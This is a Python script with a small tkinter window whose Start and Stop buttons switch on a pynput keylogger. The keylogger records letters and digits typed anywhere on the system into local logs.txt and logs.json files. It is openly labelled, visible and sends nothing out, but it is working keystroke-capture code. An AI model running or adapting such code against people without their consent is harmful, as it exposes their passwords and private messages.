import tkinter as tk
from tkinter import ttk
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("300x150")
root.title("Keylogger capturing KeyStrokes")

key_list = []
key_strokes = ""
listener = None

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w+') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global key_strokes
    try:
        char = key.char
        if char.isalnum():  # Capture only alphabets and numbers
            key_list.append(char)
            key_strokes += char
            update_txt_file(key_strokes)
            update_json_file(key_list)
    except AttributeError:
        pass

def start_keylogger():
    global listener
    print("Keystrokes are being captured.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        print("Keylogger stopped.")

def butaction():
    start_keylogger()
    start_btn.config(state=tk.DISABLED)
    stop_btn.config(state=tk.NORMAL)

def stopaction():
    stop_keylogger()
    start_btn.config(state=tk.NORMAL)
    stop_btn.config(state=tk.DISABLED)

# Create a styled frame
style = ttk.Style()
style.configure("TFrame", background="#f0f0f0")

frame = ttk.Frame(root, padding=20, style="TFrame")
frame.grid(row=0, column=0)

# Create labels and buttons
welcome_label = ttk.Label(frame, text="Keylogger capturing KeyStrokes", font=("Helvetica", 14))
welcome_label.grid(row=0, column=0, columnspan=2, padx=10, pady=10)

start_btn = ttk.Button(frame, text="Start Keylogger", command=butaction)
start_btn.grid(row=1, column=0, padx=5, pady=5)

stop_btn = ttk.Button(frame, text="Stop Keylogger", command=stopaction, state=tk.DISABLED)
stop_btn.grid(row=1, column=1, padx=5, pady=5)

root.mainloop()
